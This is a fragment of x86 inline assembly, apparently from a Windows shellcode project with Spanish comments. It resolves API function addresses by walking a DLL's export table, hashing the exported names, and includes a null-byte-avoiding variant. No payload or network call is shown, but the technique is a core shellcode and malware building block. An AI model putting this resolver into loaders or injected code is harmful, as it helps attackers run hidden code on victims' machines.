find_function_loop:
#ifdef SC_NULL
        mov  esi, [ebp+ecx*4-5]         //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions[X] (RVA)
        dec  esi
#else //SC_NULL
        mov  esi, [ebp+ecx*4-4]         //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions[X] (RVA)
#endif //SC_NULL
        add  esi, edx                   //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfNames[X] (VA) Export Name Table
compute_hash:
        xor  ebx, ebx                   //EBX = 0
        push eax
compute_hash_again:
        xor  eax, eax                   //EAX = 0
        lodsb                           //AL = BYTE[ESI];ESI++
        test al, al                     //v
        jz   compute_hash_finished      //>(AL==0)? Fin del LibName
        imul eax, al                    //v
        xor  ebx, eax                   //>hash ^= (char[i]*char[i])
        jmp  compute_hash_again
compute_hash_finished:
        pop  eax
        cmp  bx, ax                     //v
        loopne find_function_loop       //>(BX == FunctionHash)&(ECX>0)?
        mov  ebp, [edi+0x24]            //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfNames (RVA)
        add  ebp, edx                   //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfNames (VA)
#ifdef SC_NULL
        mov  cx, [ebp+ecx*2-1]
#else //SC_NULL
        mov  cx, [ebp+ecx*2]
#endif //SC_NULL
        mov  ebp, [edi+0x1C]
        add  ebp, edx
#ifdef SC_NULL
        mov  eax, [ebp+4*ecx-1]
        dec  eax
#else //SC_NULL
        mov  eax, [ebp+4*ecx]
#endif //SC_NULL

        add  eax, edx
find_function_finished:
        mov  [esp+0x1C], eax
        popad
#pragma endregion AX=HASH;EDX=BaseAddr

        //Guardamos direcci�n en buffer pila
        stosd
        loop nextFunction               //(ECX--);(ECX!=0)?
        mov  ebp, edi
        pop  ecx
        pop  edi
        ret
    }
}